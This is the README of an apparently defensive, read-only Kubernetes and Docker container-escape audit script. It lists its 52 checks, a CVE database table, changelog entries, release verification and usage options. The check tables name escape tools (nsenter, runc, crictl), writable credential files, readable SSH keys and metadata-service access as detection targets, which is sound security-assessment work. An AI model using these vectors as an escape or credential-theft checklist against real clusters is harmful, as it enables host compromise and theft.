![Logo](k8s_logo.png)

![Version](https://img.shields.io/badge/version-4.6-blue)
![Checks](https://img.shields.io/badge/checks-52-blue)
![CVEs tracked](https://img.shields.io/endpoint?url=https%3A%2F%2Fraw.githubusercontent.com%2Fliamromanis101%2FK8s-container_escape_audit%2Fmain%2F.github%2Fbadges%2Fcve-count.json)
![License](https://img.shields.io/badge/license-CC%20BY--NC%204.0-lightgrey)

# K8s_container-escape-audit

Identify exploitable Kubernetes and Docker container escape paths before attackers do..

A bash script that runs inside a Docker or Kubernetes container and checks for escape vectors. Built for penetration testers and security teams doing container security assessments.

> For authorised security assessments only. Do not run this on systems you don't have explicit written permission to test.

> There will be frequent updates to the script and the CVE database, so ensure you come back regularly to check or visit the website: https://liamromanis101.github.io/K8s-container_escape_audit/

## Designed for

The Kubernetes Container Escape Audit tool is designed for organisations that need to understand whether a compromised container could lead to host or cluster compromise.

It is suitable for:

- Platform Engineering teams validating cluster hardening.
- DevSecOps teams integrating security into CI/CD pipelines.
- Kubernetes Administrators responsible for securing production clusters.
- Cloud Security Teams assessing container workloads across AWS, Azure and hybrid environments.
- Red Teams and Penetration Testers performing authorised security assessments.

## What makes this different?

Most container security tools identify vulnerable packages or Kubernetes configuration issues.

Kubernetes Container Escape Audit focuses on exploitability:
- It evaluates whether an attacker who has already gained code execution inside a container could realistically escape that container, compromise the host, or move laterally through the cluster.
- Rather than simply reporting CVEs, it analyses the conditions required for exploitation and provides practical remediation guidance.

## What it does

`container_escape_audit.sh` v4.6 performs **52 checks** plus a config-driven CVE engine, covering: privileged configuration, dangerous capabilities, namespace isolation, filesystem mounts, kernel exposure, Kubernetes misconfigurations, cloud metadata access, kernel hardening posture (including SELinux/AppArmor enforcement), container-runtime escape surfaces (io_uring, kTLS/sockmap, Kata, KVM/arm64), container runtime version detection, and an updateable database of recent kernel and runtime CVEs. The CVE engine performs **distro- and flavour-aware version checking**: it reads authoritative NVD version ranges and per-distribution fixed versions to return an accurate *vulnerable / not-affected / defer-to-vendor / unknown* verdict, rather than a naive kernel-version comparison. All checks are strictly read-only — the script makes no changes to the system.

Each finding comes with a structured report entry:

- **What it is**: the misconfiguration or exposure
- **Impact**: worst-case if exploited
- **Exploitability**: difficulty, tooling, real-world precedent
- **Recommendation**: specific remediation steps

The tool ships as two files that must sit in the same directory:

```
container_escape_audit.sh   # main script
cve_checks.conf             # CVE database (update this independently of the script)
```

One note on running as root: checks 1, 2, and 27 (privileged mode, dangerous capabilities, UID 0 mapping) will always produce findings when you run the script as root inside the container. That's expected and correct. Running as root without user namespace remapping is itself a meaningful finding, not a false positive.

## Releases and verification

Releases are published on GitHub with **SLSA Build Level 3 provenance**. Each release carries a signed `multiple.intoto.jsonl` attestation covering both `container_escape_audit.sh` and `cve_checks.conf`, so you can cryptographically confirm that the files you're about to run as root were built by this repository's release workflow and have not been tampered with. See [Verifying the download](#verifying-the-download) below. Because this tool is intended to run with elevated privileges during assessments, verifying provenance before each use is strongly recommended.

## Latest updates

### v4.6 — bug-fix pass, five new CVEs, and Container OS support

This release fixes four detection-accuracy bugs found during review and a follow-up audit, adds five newly-disclosed CVEs, hardens distribution coverage so the engine works correctly across the container OS landscape (not just Ubuntu), and adds two small usability improvements (`[MITIGATED]` console labeling and a `--report-name` flag).

- **Severity synthesis no longer discards a confirmed module blacklist.** In `check_type=compound`, a module fully blacklisted in `/etc/modprobe.d` was previously silently overridden to CRITICAL whenever the CVE's socket-family check succeeded — even though that check only proves the generic socket *family* (e.g. AF_ALG core) is reachable, not that the specific blacklisted transform can load. The synthesis logic now recognizes four distinct states (module loaded / socket open with no gate / socket open but module blacklisted / fully mitigated) and downgrades to HIGH rather than CRITICAL when a blacklist is confirmed in place but can't be independently verified at bind()-level precision.
- **Two broken `printf` mitigation commands fixed.** The `rec` fields for CVE-2026-43284 (Dirty Frag) and CVE-2026-43503 (DirtyClone) duplicated the correctly-quoted command from `mitigation` — but without the quotes and with a doubled backslash, so `\n` was stripped and word-split by the shell before `printf` ever saw it, silently truncating a two/three-line `modprobe.d` blacklist to the single word `install`. Fixed both, removed the duplication (rec now points to the mitigation field instead of re-stating it, closing the drift risk), and added a config-lint check that flags any future unquoted `printf` in `rec`/`mitigation` at load time.
- **runc CVEs (CVE-2019-5736, CVE-2024-21626) now use check 52's live detection instead of a static advisory.** Previously, check 52 (`check_runtime_versions`) correctly probed the host's actual runc binary, but the CVE-database `manual` entries for these two CVEs never consulted its result — they always rendered the conf's static `component_fixed=1.0-rc7` text at CRITICAL regardless of the real installed version. Check 52 now caches its verdict globally, and the `manual` dispatch renders a **definitive** finding (CRITICAL if genuinely behind the fix, confirmed-not-vulnerable otherwise) whenever a runc binary was reachable, falling back to the original three-state advisory only when it wasn't.
- **Five new CVE database entries** (2026-07 disclosures): **Januscape (CVE-2026-53359)**, a KVM/x86 shadow-MMU guest-to-host UAF, tracked alongside its required companion fix **CVE-2026-46113** (patching one without the other leaves the host exposed); **CVE-2026-53362**, an IPv6 fragmentation container escape; **Bad Epoll (CVE-2026-46242)**, an epoll `ep_remove()` race UAF that also roots Android v6.6+; and **GhostLock (CVE-2026-43499)**, a ~15-year-old futex priority-inheritance UAF (watch for the regression it introduced, CVE-2026-53166, in the first upstream fix attempt). None are CISA KEV-listed or confirmed exploited in the wild yet; several carry `VERIFY` markers where NVD had not published a CPE configuration at the time of writing — confirm against the vendor tracker before relying on them for automated severity scoring. Database total: 27 → 32 entries.
- **Container OS support fixed for Amazon Linux, SUSE, OpenShift/RHCOS, and Azure Linux.** The distro-ID normalization that feeds `distro_status`/`vendor_defer` matching previously used `/etc/os-release`'s `ID=` field verbatim, so real hosts silently failed to match the conf's vendor tokens: Amazon Linux 2/2023 report `ID=amzn` (conf uses `amazon`), SUSE reports `ID=sles` (conf uses `suse`), OpenShift nodes (RHCOS) report `ID=rhcos` with no direct token at all despite the conf already carrying an `openshift|...` advisory row, and Azure Linux (AKS's node OS) wasn't recognized at all — legacy CBL-Mariner reports `ID=mariner`, current Azure Linux 3.0+ reports `ID=azurelinux` (confirmed against a real `/etc/os-release`, both now normalize to one token). RHCOS is additionally dual-matched against both `openshift`-specific and general `rhel` rows, since it's genuinely RHEL-based (`ID_LIKE="rhel fedora"`) but also carries its own advisories. See [Container OS / distribution support](#container-os--distribution-support) for full coverage and known gaps (Alpine, Bottlerocket, Talos, Flatcar).
- **Heuristic fallback for distro kernels with no matching conf data.** Previously, a distro-packaged kernel with no `distro_status`/`vendor_defer` row for its distribution returned a bare "unknown" with zero supporting signal. The engine now also compares the running kernel's base version against the CVE's NVD upstream ranges and surfaces that as clearly-labeled, non-authoritative context — never promoted to a verdict, since distro backports can move independently of the base version string in either direction, but useful evidence while a proper `distro_status` row is added. Also added the missing `ubuntu|24.04|...` row for Copy Fail (CVE-2026-31431), which is what surfaced this gap.
- **Full-mainline-series promotion for the heuristic fallback.** Refined the above: when a distro kernel's base version is only in the *same* mainline series as a CVE's fix (e.g. `6.16.50` vs. a fix at `6.16.1`), the comparison correctly stays an unpromoted heuristic — distro point-release numbering doesn't track upstream 1:1 within a series. But when it's a *full series* past the fix (e.g. `6.17.x` vs. a fix in the `6.16` series), it's now promoted to a confident `not-affected` verdict rather than left at a conservative "unknown" — kernel.org releases are strictly cumulative, so this isn't really a guess. A follow-up audit this surfaced also found three old CVEs (DirtyCOW, Flipping Pages, OverlayFS SetUID) with a dangling `vendor_defer` reference to a `distro_status` field that didn't exist, which — because `vendor_defer` is checked *before* the heuristic fallback — silently blocked this promotion from ever running for those CVEs on Ubuntu/Debian. Fixed.
- **`[MITIGATED]` console tag.** When a `compound` CVE's severity is genuinely downgraded by a confirmed control (a fully blacklisted module), the terminal now shows `[MITIGATED]` in that downgraded severity's own colour instead of a plain severity word that didn't distinguish "actively downgraded by something we found" from "this CVE is just inherently this severity." A closely related state — module not loaded but also *not* blacklisted, so it could auto-load at any time — deliberately keeps the plain severity word rather than `MITIGATED`, since no real control was found there. Console-display only; JSON/structured severity values are unchanged.
- **`--report-name` flag.** Lets you set the report file's base name (e.g. `--report-name prod-node-07`) while keeping the automatic `_<timestamp>.txt` suffix the default filename has always used, without needing to construct the full timestamped filename yourself the way `--report` requires. `--report` itself is unchanged — it still takes a complete filename verbatim, with nothing appended.
- **`--check-updates` flag.** Fully opt-in (no network call is ever made otherwise), and a standalone mode: it runs the check, prints the result, and exits — it does **not** also run the full audit. Checks the GitHub repo for a newer script release (`release.txt`, a bare version string) and a newer CVE database (`cve_release.txt`, a bare date, compared against the local `cve_checks.conf`'s own `# Last updated:` line — so it reflects whatever conf file you're actually using). Prints a simple `[Script]: Yes|No` / `[CVEs]: Yes|No` summary; if GitHub can't be reached, says so plainly and points you at the repo instead of failing or blocking. Note: combined with `--json`, it currently produces no output at all (JSON mode suppresses the plain-text update summary, and there's no JSON-formatted equivalent yet) — use it without `--json` if you want to see the result.

### v4.5 — accurate version verdicts (NVD-backed CVE engine)

This release makes the CVE engine's version checking genuinely accurate, replacing the previous naive per-series comparison that could both miss vulnerable kernels and clear patched ones.

- **Distro- and flavour-aware verdict engine.** The engine now detects the running distribution, release, kernel flavour (generic / aws / azure / gcp / vanilla), and installed kernel package version, then judges each CVE with the version scheme that actually applies — upstream-stable, Debian (`dpkg`-correct, epoch- and `~`-aware), or Ubuntu (`ABI.upload`) — never one comparator for all. Every verdict is one of **vulnerable / not-affected / defer-to-vendor / unknown**; absent or unmatched data resolves to *unknown*, never a silent pass.
- **NVD-backed data pass across the entire database.** All 20 version-dependent kernel CVEs were re-verified against NVD CPE configuration ranges and converted to an enriched schema (`upstream_ranges`, `distro_status`, `vendor_defer`). This corrected real errors in the previous data: a duplicated CVE ID (an OverlayFS entry mis-tagged as CVE-2025-38352 — actually **CVE-2023-0386**), several wrong `introduced` floors, stale fixed-version points, and numerous missing affected ranges that had left older vulnerable kernels undetected.
- **Closed-world model for upstream kernels.** For a vanilla/mainline kernel, NVD's affected ranges are treated as authoritative and complete: inside any range ⇒ vulnerable, otherwise ⇒ not-affected. This is applied only to vanilla kernels — distro-packaged kernels (whose back-ported fixes hide behind an unchanged base version) are judged by their `distro_status` package versions or deferred to the vendor, so back-ported fixes are never mistaken for exposure.
- **Per-distribution status, including partial fixes.** `distro_status` records fixed / not-affected / vulnerable per release, so an entry can express (for example) "Debian Trixie fixed, Bookworm and Bullseye still vulnerable" — a state the old single-fixed-version format could not represent.
- **SELinux enforcement check + system-state registry (check 11).** SELinux enforcing/permissive/disabled is now detected (previously only named), and generic system-state signals (MAC enforcement, user-namespace restriction, `/proc/sys` writability, CAP_SYS_ADMIN, root-mapping) are published to an internal registry that composite CVE checks consume instead of re-deriving. A `--dump-state` flag prints the registry.
- **New check 52 — container runtime version probe.** Best-effort, read-only detection of reachable runc / containerd / cri-o versions, giving the runc CVE entries a real three-state detection signal.
- **Expanded behavioural checks.** Check 2 now decodes 16 dangerous capabilities (adding CAP_BPF, CAP_PERFMON, CAP_DAC_OVERRIDE, CAP_MKNOD, CAP_SYS_CHROOT, CAP_NET_RAW, CAP_SYSLOG); check 11 reports `no_new_privs`; check 30 adds `impersonate` and `pods/attach` RBAC probes; check 47 adds `rds_tcp`, `vsock`, and `vmw_vsock_virtio_transport` to the dangerous-modules audit.

### v4.4 and earlier (2026-06)

Coverage expanded following the CVE monitor's gap analysis:

- **Four new read-only probes (checks 48-51):** io_uring reachability, kTLS/sockmap ULP attach surface, Kata Containers agent-socket exposure, and arm64 KVM/vGIC-ITS guest-to-host exposure.
- **Eight new CVE database entries**, including the first public KVM/arm64 guest-to-host escape (CVE-2026-46316 "ITScape", CVSS 9.3), the io_uring zcrx out-of-bounds write (CVE-2026-43121), and the ksmbd remote kernel use-after-free (CVE-2022-47939).
- **Two further kernel-LPE entries (2026-06-29):** CVE-2026-43503 ("DirtyClone", CVSS 8.8) — the fourth DirtyFrag-family page-cache-write variant, paired with Fragnesia/CVE-2026-46300 as one split remediation — and CVE-2026-46331 ("pedit COW", CVSS 8.5) — a partial-COW page-cache corruption in the `net/sched` `act_pedit` traffic-control action with a public `packet_edit_meme` PoC.
- **Two historical runc container-escape entries:** CVE-2019-5736 (the classic `/proc/self/exe` host-binary overwrite, CVSS 8.6, CISA KEV, fixed in runc 1.0-rc7) and CVE-2024-21626 ("Leaky Vessels", `process.cwd` leaked-fd breakout, CVSS 8.6, fixed in runc 1.1.12). Both are `check_type=manual` entries — the host runc version is generally not observable from inside a container, so a clean result is treated as *unknown* rather than *safe*, with check 52's runtime-version probe as the practical detection hook. The Leaky Vessels BuildKit siblings (CVE-2024-23651/23652/23653) are intentionally excluded as out-of-scope image-build tooling.
- **`check_type=manual`** in the CVE engine, letting the database track container-runtime and userspace CVEs (Kata, containerd, Podman, runc, cgroup release_agent) that do not reduce to a kernel version or module test.
- **SLSA Build L3 provenance** published with each release (signed `multiple.intoto.jsonl`), verifiable with `slsa-verifier`.

Kernel-CVE version data is now verified against NVD and the Debian/Ubuntu security trackers. A few distro-specific package strings remain marked `VERIFY` / `approx` in `cve_checks.conf` (notably the Podman `component_fixed`, and some exact Ubuntu `ABI.upload` builds) and should be confirmed against your distribution's security tracker before being relied upon for patch decisions. ITScape is arm64-only.


## Checks

### Container configuration

| # | Check | Severity |
|---|---|---|
| 1 | Privileged container (`--privileged`) | CRITICAL |
| 2 | Dangerous Linux capabilities (CAP_SYS_ADMIN, CAP_SYS_PTRACE, CAP_SYS_MODULE, etc.) | HIGH |
| 3 | Host namespace sharing (PID, network, IPC, UTS, mount) | HIGH |
| 11 | Seccomp / AppArmor / SELinux disabled or unconfined | MEDIUM |
| 27 | User namespace UID mapping (root-in-container = root-on-host) | HIGH |

### Filesystem and mounts

| # | Check | Severity |
|---|---|---|
| 4 | Dangerous host filesystem mounts (`/`, `/etc`, `/dev`, `/sys`, runtime sockets) | CRITICAL |
| 5 | `/proc` exposure (core_pattern, sysrq-trigger, kcore, kmem, PID1 environ) | CRITICAL |
| 8 | Writable cron directories | HIGH |
| 9 | Writable authentication files (`/etc/passwd`, `/etc/shadow`, `/etc/sudoers`) | CRITICAL |
| 13 | SUID/SGID binaries | MEDIUM |
| 17 | Writable dynamic linker config (`/etc/ld.so.preload`, `ld.so.conf.d`) | HIGH |
| 23 | OverlayFS upper directory writability / layer inspection | MEDIUM |
| 33 | OCI hook injection paths (`/run/oci/hooks.d`) | CRITICAL/MEDIUM |

### Kernel

| # | Check | Severity |
|---|---|---|
| 10 | `/dev/mem` access and ptrace scope | CRITICAL |
| 12 | cgroup v1 `release_agent` escape path | CRITICAL |
| 14 | Kernel version (informational; CVE checks handled by the engine) | INFO |
| 19 | cgroup v2 writability | MEDIUM |
| 22 | Kernel module loading status (`modules_disabled`) | INFO |
| 28 | eBPF exposure (CAP_BPF + bpf syscall availability) | CRITICAL |
| 29 | debugfs / tracefs mounted and accessible | HIGH |
| 32 | Kernel keyring exposure | HIGH |
| 34 | Page cache write primitives (splice + pipe2 syscall availability) | HIGH |
| 35 | Procfs namespace file descriptor leakage | MEDIUM |

### Kubernetes and cloud

| # | Check | Severity |
|---|---|---|
| 6 | Kubernetes service account token and RBAC permissions | HIGH-CRITICAL |
| 7 | Environment variable secret leakage | MEDIUM |
| 15 | Cloud instance metadata service reachable (AWS, Azure, GCP) | CRITICAL |
| 16 | Kubelet API exposed unauthenticated (ports 10250, 10255) | CRITICAL |
| 20 | Secret mount directories (`/run/secrets`, `/var/run/secrets`) | HIGH |
| 30 | Kubernetes RBAC active escalation path probing | HIGH-CRITICAL |

### Host access

| # | Check | Severity |
|---|---|---|
| 18 | Namespace escape tooling present (`nsenter`, `unshare`, `runc`, `crictl`) | MEDIUM |
| 21 | SSH private keys readable | HIGH |
| 31 | Additional container runtime sockets (Podman, BuildKit, Kata) | CRITICAL |

### Runtime and namespace (new checks 24-35)

This group covers the escape and runtime vectors added after the original 1-23 baseline. Checks 24 and 46 are handled by the config-driven CVE engine (see [CVE engine](#cve-engine)) rather than as standalone functions; the remainder are listed in their topical tables above and collected here for reference.

| # | Check | Severity |
|---|---|---|
| 24 | Copy Fail (CVE-2026-31431) AF_ALG page-cache write — via CVE engine | CRITICAL |
| 25 | NVIDIAScape (CVE-2025-23266) — NVIDIA Container Toolkit OCI hook LD_PRELOAD injection | CRITICAL |
| 26 | runc masked path race (CVE-2025-31133 / CVE-2025-52565 / CVE-2025-52881) | CRITICAL |
| 27 | User namespace UID mapping (root-in-container = root-on-host without remapping) | HIGH |
| 28 | eBPF exposure (CAP_BPF + bpf syscall availability) | CRITICAL |
| 29 | debugfs / tracefs mounted and accessible | HIGH |
| 30 | Kubernetes RBAC active escalation path probing | HIGH-CRITICAL |
| 31 | Additional container runtime sockets (Podman, BuildKit, Kata) | CRITICAL |
| 32 | Kernel keyring exposure | HIGH |
| 33 | OCI hook injection paths (`/run/oci/hooks.d`) | CRITICAL/MEDIUM |
| 34 | Core pattern and page cache write primitives (splice + pipe2 syscall availability) | HIGH |
| 35 | Procfs namespace file descriptor leakage | MEDIUM |

### Kernel hardening posture (new checks 36-47)

These checks read sysctl values from `/proc/sys` and compare them against the recommended hardening baseline. All are read-only. Values reflect the host kernel configuration.

| # | Parameter | Recommended | Risk |
|---|-----------|-------------|------|
| 36 | `kernel.kptr_restrict` | 2 | KASLR bypass |
| 37 | `kernel.dmesg_restrict` | 1 | Kernel address/register leakage |
| 38 | `kernel.randomize_va_space` | 2 | ASLR partial or disabled |
| 39 | `fs.protected_symlinks` / `fs.protected_hardlinks` | 1 | /tmp symlink and hardlink attacks |
| 40 | `fs.protected_fifos` / `fs.protected_regular` | 2 | FIFO stalling and O_CREAT confusion |
| 41 | `net.ipv4.tcp_syncookies` | 1 | SYN flood DoS |
| 42 | ICMP redirects / source routing / rp_filter | 0 / 0 / 1 | MitM on pod network |
| 43 | `net.ipv4.ip_forward` / IPv6 forwarding | informational | Expected on K8s nodes |
| 44 | `kernel.unprivileged_userns_clone` | 0 | User namespace prerequisite for most container escape CVEs |
| 45 | `kernel.perf_event_paranoid` | ≥ 2 | Spectre-class side-channel attacks |
| 46 | esp4 / esp6 / rxrpc modules | not loaded / blacklisted | Dirty Frag (CVE-2026-43284/43500), Fragnesia (CVE-2026-46300), DirtyClone (CVE-2026-43503) |
| 47 | Dangerous loaded modules audit | — | 15 modules checked incl. algif_aead, ksmbd, rds, rds_tcp, nf_tables, dccp, sctp, bluetooth |

### Runtime escape-surface probes (new checks 48-52)

Read-only reachability probes for container-escape and LPE attack surfaces flagged by the CVE monitor's gap analysis. Each tests whether a subsystem is reachable from the current context (syscall, socket, or socket-file presence) without attempting to trigger any vulnerability. They complement the version/module/socket detection done by the CVE engine.

| # | Check | Severity | Related CVE(s) |
|---|---|---|---|
| 48 | io_uring reachability (`io_uring_setup(2)` + `io_uring_disabled` state) | HIGH | CVE-2026-43121 (zcrx OOB) and the io_uring LPE class |
| 49 | kTLS / sockmap ULP attachable (`setsockopt(TCP_ULP, "tls")`) | MEDIUM | kTLS/sockmap "Reverse Order" UAF, `tls_sk_proto_close()` UAF (no CVE yet) |
| 50 | Kata Containers agent socket / shared dir exposure | HIGH/MEDIUM | CVE-2026-41326 (CopyFile symlink subversion) |
| 51 | KVM/arm64 vGIC-ITS guest-to-host exposure (arch-aware) | HIGH/INFO | CVE-2026-46316 (ITScape) |
| 52 | Container runtime version probe (runc / containerd / cri-o, best-effort read-only) | CRITICAL/MEDIUM/INFO | CVE-2019-5736, CVE-2024-21626 (runc escapes) |

> Check 51 is architecture-aware: on x86_64 it reports "not applicable"; on arm64 it distinguishes a KVM host (`/dev/kvm` present) from a guest vantage point (GICv3/ITS present, no `/dev/kvm`) and adjusts severity accordingly.

> Check 52 reads any reachable runc / containerd / cri-o binary and runs `<binary> --version` (never executing untrusted output, never writing). Because a container usually cannot see the host runtime binary, it uses a three-state verdict: a reachable version is compared directly; if none is reachable but the process is unmapped in-container root, it reports the runc-escape preconditions as *potentially exposed*; otherwise the version is *unknown* — never silently *safe*. Its runc verdict is also cached and consulted directly by the CVE-database `manual` entries for CVE-2019-5736 and CVE-2024-21626 (see [Config-driven CVE checks](#config-driven-cve-checks)), so a reachable binary produces a definitive per-CVE finding rather than a static advisory.

### Config-driven CVE checks

CVE checks are loaded from `cve_checks.conf` and run by the embedded engine. The database ships with thirty-two entries and can be updated independently of the script. See [CVE engine](#cve-engine) below.

Kernel-CVE entries carry authoritative NVD version data in an enriched schema: `upstream_ranges` (NVD CPE affected/fixed ranges for vanilla kernels), `distro_status` (per-distribution-release fixed / not-affected / vulnerable, with exact package versions for Debian and Ubuntu), and `vendor_defer` (distributions such as RHEL / Amazon / SUSE whose back-ports can't be judged from a version string). The engine reads these to produce a **vulnerable / not-affected / defer / unknown** verdict appropriate to the running system, rather than a naive comparison.

| CVE | Name | CVSS | ITW | CISA KEV |
|-----|------|------|-----|----------|
| CVE-2026-43494 | PinTheft (RDS + io_uring page-cache overwrite) | 7.8 | | |
| CVE-2026-31431 | Copy Fail | 7.8 | ✓ | ✓ |
| CVE-2026-46333 | Ptrace Credential Hijack | 7.8 | ✓ | |
| CVE-2026-23111 | nf_tables Catchall Verdict-Map UAF | 7.8 | | |
| CVE-2026-46300 | Fragnesia ESP | 7.8 | | |
| CVE-2026-43503 | DirtyClone | 8.8 | | |
| CVE-2026-46243 | CIFSwitch (CIFS SPNEGO upcall LPE) | 7.8 | | |
| CVE-2026-43284 | Dirty Frag ESP | 8.8 | ✓ | |
| CVE-2026-43500 | Dirty Frag RxRPC | 7.8 | ✓ | |
| CVE-2026-46331 | pedit COW (act_pedit partial-COW) | 8.5 | | |
| CVE-2024-1086 | Flipping Pages | 7.8 | ✓ | ✓ |
| CVE-2025-21756 | Attack of the Vsock | 7.8 | | |
| CVE-2025-38352 | Chronomaly | 7.0 | ✓ | |
| CVE-2025-38617 | Packet Socket Race | 7.8 | | |
| CVE-2023-0386 | OverlayFS SetUID Copy-Up (FUSE) Privilege Escalation | 7.8 | ✓ | ✓ |
| CVE-2022-0847 | DirtyPipe | 7.8 | | |
| CVE-2016-5195 | DirtyCOW | 7.8 | ✓ | ✓ |
| CVE-2026-46316 | ITScape (KVM/arm64 guest-to-host escape) | 9.3 | | |
| CVE-2026-43121 | io_uring zcrx Freelist OOB | 7.0 | | |
| CVE-2022-47939 | ksmbd Tree-Disconnect UAF | 9.8 | | |
| CVE-2026-41326 | Kata CopyFile Symlink Subversion | 8.2 | | |
| CVE-2026-46680 | containerd runAsNonRoot Bypass | 7.3 | | |
| CVE-2026-55686 | Podman WORKDIR Symlink Host Write | 5.3 | | |
| CVE-2026-41579 | runc /dev Symlink Limited Host Write | 3.3 | | |
| CVE-2019-5736 | runc /proc/self/exe Host Binary Overwrite | 8.6 | ✓ | ✓ |
| CVE-2024-21626 | runc process.cwd Leaked-FD Container Breakout (Leaky Vessels) | 8.6 | | |
| CVE-2022-0492 | cgroup release_agent Escape | 7.0 | ✓ | ✓ |
| CVE-2026-53359 | Januscape (KVM/x86 shadow-MMU guest-to-host UAF) | 8.8 | | |
| CVE-2026-46113 | KVM Shadow-MMU UAF (Januscape companion) | VERIFY | | |
| CVE-2026-53362 | IPv6 Fragmentation Container Escape | VERIFY | | |
| CVE-2026-46242 | Bad Epoll (epoll `ep_remove()` race UAF) | VERIFY | | |
| CVE-2026-43499 | GhostLock (futex priority-inheritance UAF) | VERIFY | | |

> **2026-07 sweep (CVE-2026-53359, -46113, -53362, -46242, -43499).** None are CISA KEV-listed or confirmed exploited in the wild as of this pass. Several fields carry `VERIFY` markers (CVSS, some `fixed_versions`, the CVE-2026-53362 ↔ pre-CVE "ipv6_frag_escape" identity correlation) where NVD had not published a CPE configuration at the time of writing — confirm against the vendor tracker before relying on them for automated severity scoring. Januscape (CVE-2026-53359) requires its companion fix, CVE-2026-46113, to be applied at the same time — the two patch separate use-after-frees disclosed months apart in the same shared Intel/AMD shadow-MMU code path, and patching only one leaves the host exploitable. Januscape is **x86_64-only** (`arch=x86_64`) — arm64 KVM has its own, unrelated bug (ITScape, CVE-2026-46316). GhostLock introduced a regression bug in its first upstream fix attempt, tracked separately as CVE-2026-53166 — confirm the *final* fix is present, not just any patch labelled as fixing GhostLock.

> **Kernel CVEs** use the `kernel_version` or `compound` check types and are judged by the NVD-backed version engine (vulnerable / not-affected / defer / unknown). **Runtime / userspace CVEs** (CVE-2026-41326 Kata, CVE-2026-46680 containerd, CVE-2026-55686 Podman, CVE-2026-41579 / CVE-2019-5736 / CVE-2024-21626 runc, CVE-2022-0492 cgroup) use `check_type=manual` — they do not reduce to a kernel version or module test, so the engine emits a tracking finding with the component fix recorded in `component_fixed`, while live detection is done by a dedicated script check (e.g. check 52's runtime-version probe for runc). CVE-2022-0492 (cgroup) is a dual-nature entry: it is `manual` (its exploitability depends on the behavioural cgroup-v1 / CAP_SYS_ADMIN check) but also carries NVD `upstream_ranges` that the engine surfaces as a supporting version signal. For the historical runc escapes (CVE-2019-5736, CVE-2024-21626), the `manual` dispatch now consults check 52's cached runc-version result directly: if a runc binary was reachable anywhere in the run, these entries render a **definitive** verdict (confirmed vulnerable or confirmed patched) instead of the generic advisory; only when no runc binary was reachable does it fall back to the original *unknown-rather-than-safe* three-state advisory.

> **DirtyFrag family.** CVE-2026-43503 (DirtyClone), CVE-2026-46300 (Fragnesia), and CVE-2026-43284 / CVE-2026-43500 (Dirty Frag) are sibling page-cache-write LPEs sharing one primitive: file-backed page-cache memory treated as a writable network buffer because the `SKBFL_SHARED_FRAG` marker is dropped along some skb path. **Important:** CVE-2026-46300 and CVE-2026-43503 are a single upstream remediation split across two CVE IDs — the kernel CNA assigned 43503 to the *second* Fragnesia commit (`48f6a5356a33`), and both ship together in the same vendor advisories (e.g. Debian DSA-6295-1). Track and patch them as a pair; a host fixed for one but not the other is not protected. The esp4/esp6/rxrpc module audit (check 46) and the kernel-version test together gate this family.

> All version-dependent kernel CVEs now carry NVD-verified `upstream_ranges` (and `distro_status` where Debian/Ubuntu package versions are confirmed). The remaining items needing confirmation before a "patched" verdict is relied upon are: **CVE-2026-46316** (ITScape — no NVD entry published yet; encoded with its introduced floor only, so 6.9+ arm64 kernels are treated as not-vulnerable pending fixed-version data), the `component_fixed` for **CVE-2026-55686** (Podman — awaiting the version from GHSA-q6r4-3wmg-fwcq), and some exact Ubuntu `ABI.upload` package builds and Debian package strings marked `[approx]` in the conf. Confirm these against your distribution's security tracker. Note CVE-2026-46333's CVSS is disputed (NVD 5.5 vs Red Hat/Qualys "Important"); the database uses 7.8 for practical-impact alerting. ITScape (CVE-2026-46316) is **arm64-only**; its `arch=arm64` key means the engine reports it as N/A on non-arm64 hosts (see [Architecture-specific CVEs](#architecture-specific-cves)), and check 51 provides an architecture-aware behavioural probe.

## Usage

The recommended way to obtain the tool is from a **verified GitHub release**, so you can confirm provenance before running anything with elevated privileges. A direct `curl` from `main` is also available for quick, throwaway lab use.

### Option A — verified release (recommended)

Requires the [GitHub CLI](https://cli.github.com/) (`gh`) and [`slsa-verifier`](#verifying-the-download).

```bash
# Download the released artifacts and their signed provenance
gh release download --repo liamromanis101/K8s-container_escape_audit \
  --pattern "container_escape_audit.sh" \
  --pattern "cve_checks.conf" \
  --pattern "multiple.intoto.jsonl"

# Verify provenance (both files at once) before trusting them
slsa-verifier verify-artifact container_escape_audit.sh cve_checks.conf \
  --provenance-path multiple.intoto.jsonl \
  --source-uri github.com/liamromanis101/K8s-container_escape_audit

chmod +x container_escape_audit.sh
./container_escape_audit.sh
```

A `PASSED: Verified SLSA provenance` line confirms the files are authentic before you run them.

### Option B — direct download from `main` (quick lab use)

```bash
curl -O https://raw.githubusercontent.com/liamromanis101/K8s-container_escape_audit/main/container_escape_audit.sh
curl -O https://raw.githubusercontent.com/liamromanis101/K8s-container_escape_audit/main/cve_checks.conf
chmod +x container_escape_audit.sh
./container_escape_audit.sh
```

> This route is convenient for disposable lab containers but provides **no provenance guarantee** — the files are not verified against a signed attestation. Prefer Option A for any real assessment.

Both files must be in the same directory. The script looks for `cve_checks.conf` alongside itself by default.

### Verifying the download

Releases are published with SLSA Build Level 3 provenance: a signed in-toto attestation (`multiple.intoto.jsonl`) generated by the release workflow using GitHub's OIDC identity and Sigstore keyless signing. Verifying it confirms three things at once — the files came from this repository, they were produced by the expected workflow, and their contents match the recorded digests (no tampering in transit or at rest).

Install `slsa-verifier` (current version v2.7.1) using whichever method suits you:

```bash
# Go (binary lands in $(go env GOPATH)/bin — ensure that's on your PATH)
go install github.com/slsa-framework/slsa-verifier/v2/cli/slsa-verifier@v2.7.1

# macOS (Homebrew, community-maintained formula)
brew install slsa-verifier
```

You can also download a prebuilt binary from the [slsa-verifier releases](https://github.com/slsa-framework/slsa-verifier/releases) and check it against the published `SHA256SUM.md`.

Then verify (optionally pin the expected tag with `--source-tag`):

```bash
slsa-verifier verify-artifact container_escape_audit.sh cve_checks.conf \
  --provenance-path multiple.intoto.jsonl \
  --source-uri github.com/liamromanis101/K8s-container_escape_audit \
  --source-tag v4.5
```

The provenance file is named `multiple.intoto.jsonl` because each release attests to more than one artifact. Always verify the files **as downloaded from the release** — the verifier compares the exact bytes you pass against the signed digests, so a locally modified copy will (correctly) fail.

### Options

```
--report <file>    Write detailed report to <file> exactly as given (no
                   timestamp appended)
                   Default: container_escape_report_<timestamp>.txt
--report-name <n>  Use <n> as the report file's base name, with the same
                   "_<timestamp>.txt" suffix the default uses (e.g.
                   --report-name prod-node-07 -> prod-node-07_20260714_153000.txt).
                   Ignored (with a warning) if --report is also given, since
                   --report already specifies a complete filename.
--json             Emit JSON summary to stdout
--quiet            Suppress info lines, print only WARN/CRITICAL to terminal
--no-report        Skip writing the report file
--cve-conf <file>  Path to CVE database file
                   Default: cve_checks.conf in the same directory as the script
